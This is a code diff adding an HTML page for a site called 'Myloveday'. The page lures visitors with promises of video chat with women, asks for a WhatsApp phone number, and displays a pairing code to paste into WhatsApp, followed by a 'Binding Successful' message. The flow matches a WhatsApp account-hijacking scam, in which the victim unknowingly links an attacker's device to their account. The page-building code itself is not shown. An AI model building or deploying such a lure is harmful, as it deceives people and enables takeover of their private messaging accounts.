@@ -1,0 +1,108 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title data-copy="title">Myloveday</title>
+    <meta name="description" content="Log in with WhatsApp to video chat." data-copy="description" />
+    <meta property="og:title" content="Myloveday" data-copy="title" />
+    <meta property="og:description" content="Log in with WhatsApp to video chat." data-copy="description" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="assets/images/og-image.jpg" />
+    <link rel="stylesheet" href="assets/theme.css" />
+    <script src="assets/scene.js" defer></script>
+    <script src="assets/account-link-elements.js" defer></script>
+  </head>
+  <body>
+    <div id="landing-stage">
+      <div class="container">
+        <div class="header">
+          <div class="description"></div>
+        </div>
+        <div class="main-image-section">
+          <div class="scrolling-images">
+            <div class="scrolling-image"></div>
+            <div class="scrolling-image"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="left-container">
+        <div class="title-text">&nbsp; &nbsp; &nbsp;<span data-copy="brandTitle">Myloveday</span></div>
+        <div class="left-image-text-container">
+          <div class="left-image">
+            <img src="assets/images/cs1.jpg" alt="" width="437" height="779" loading="lazy" />
+          </div>
+          <div class="text-label" data-copy="heroText">
+            Log in with WhatsApp to video chat with real women. (The women here are very direct.)
+          </div>
+        </div>
+      </div>
+
+      <div class="thumbnails">
+        <div class="thumbnails-container">
+          <img src="assets/images/2.jpg" alt="" class="thumbnail" width="437" height="779" loading="lazy" />
+          <img src="assets/images/3-1.jpg" alt="" class="thumbnail" width="440" height="779" loading="lazy" />
+          <img src="assets/images/4.jpg" alt="" class="thumbnail" width="439" height="777" loading="lazy" />
+          <img src="assets/images/5-1.jpg" alt="" class="thumbnail" width="439" height="779" loading="lazy" />
+          <img src="assets/images/6-1.jpg" alt="" class="thumbnail" width="460" height="690" loading="lazy" />
+          <img src="assets/images/7.jpg" alt="" class="thumbnail" width="438" height="780" loading="lazy" />
+          <img src="assets/images/8.jpg" alt="" class="thumbnail" width="437" height="780" loading="lazy" />
+        </div>
+      </div>
+
+      <span id="cta-copy" hidden data-copy="ctaButton">Login with WhatsApp</span>
+      <button type="button" class="download-button" id="downloadButton"></button>
+    </div>
+
+    <div class="main-container" id="main-container">
+      <div class="text-info">
+        <h2 data-copy="overlayTitle">Log in to unlock Full Photo &amp; Video</h2>
+        <p data-copy="overlaySubtitle">Enjoy more exciting content!</p>
+      </div>
+
+      <span id="phone-copy" hidden>
+        <span data-copy="phoneLabel">Please enter WhatsApp Phone number</span>
+        <span data-copy="phonePlaceholder">Enter your phone number</span>
+        <span data-copy="countrySearchPlaceholder">Search for country name or code</span>
+        <span data-copy="submitLabel">CONTINUE</span>
+        <span data-copy="pairingTitle">Enter Code on Your Phone</span>
+        <span data-copy="associating">Associating WhatsApp account</span>
+        <span data-copy="tipsHeading">Helpful Tips</span>
+        <span data-copy="tipsCopied">The pairing code has been copied, please paste it in WhatsApp</span>
+        <span data-copy="verificationLabel">Verification Code:</span>
+        <span data-copy="successTitle">Binding Successful!</span>
+        <span data-copy="successBody">Your WhatsApp account has been successfully bound!</span>
+        <span data-copy="successFooter">You can now enjoy full access to exciting content.</span>
+        <span data-copy="successContinue">Continue</span>
+      </span>
+
+      <account-link-flow class="login-flow">
+        <div class="login-box" id="login-card">
+          <phone-number-field></phone-number-field>
+        </div>
+        <account-link-submit id="continue-btn"></account-link-submit>
+        <pairing-code-panel></pairing-code-panel>
+        <app-launch-actions></app-launch-actions>
+        <account-link-status></account-link-status>
+        <account-initialization-status></account-initialization-status>
+      </account-link-flow>
+    </div>
+
+    <div class="success-modal" id="success-modal" hidden>
+      <div class="success-modal-card">
+        <h2 class="success-modal-title" data-copy="successTitle">Binding Successful!</h2>
+        <p class="success-modal-body" data-copy="successBody">
+          Your WhatsApp account has been successfully bound!
+        </p>
+        <div class="ok-circle" aria-hidden="true">✔</div>
+        <p class="success-modal-footer" data-copy="successFooter">
+          You can now enjoy full access to exciting content.
+        </p>
+        <button type="button" class="success-continue-btn" id="success-continue-btn" data-copy="successContinue">
+          Continue
+        </button>
+      </div>
+    </div>
+  </body>
+</html>
